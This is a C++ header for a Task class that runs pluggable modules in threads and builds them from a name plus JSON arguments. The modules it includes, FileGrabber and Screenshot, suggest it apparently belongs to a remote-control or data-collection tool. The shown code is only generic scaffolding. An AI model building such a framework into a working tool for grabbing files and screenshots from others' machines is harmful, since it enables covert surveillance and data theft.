#pragma once

#include <thread>
#include <iostream>
#include "BaseModule.h"
#include "../Modules/FileGrabber.h"
#include "../Modules/Screenshot.h"

using supported_modules = supported_modules_enum;

class Task
{
private:
    std::thread task;
    std::unique_ptr<BaseModule> m; /* m must be declared as pointer because its a pure virtual class */

public:
    Task(const Task &) = delete;

    Task(BaseModule * module_base) : m(module_base)
    { 
        /* */
    };

    ~Task()
    {
        stop();
    };

    void run()
    {
        if(m.get())
        {
            std::cout << "running thread";
            task = std::thread(&BaseModule::run, m.get());
        }        
    }

    void stop()
    {
        if (task.joinable() && m.get())
        {
            m->stop();
            task.join();
        }
    }

    const std::string & get_task_type()
    {
        return m->get_module_type();
    }

    bool operator==(Task * t2);

    static Task * BuildTask(const std::string & module_name, const json & args);
};
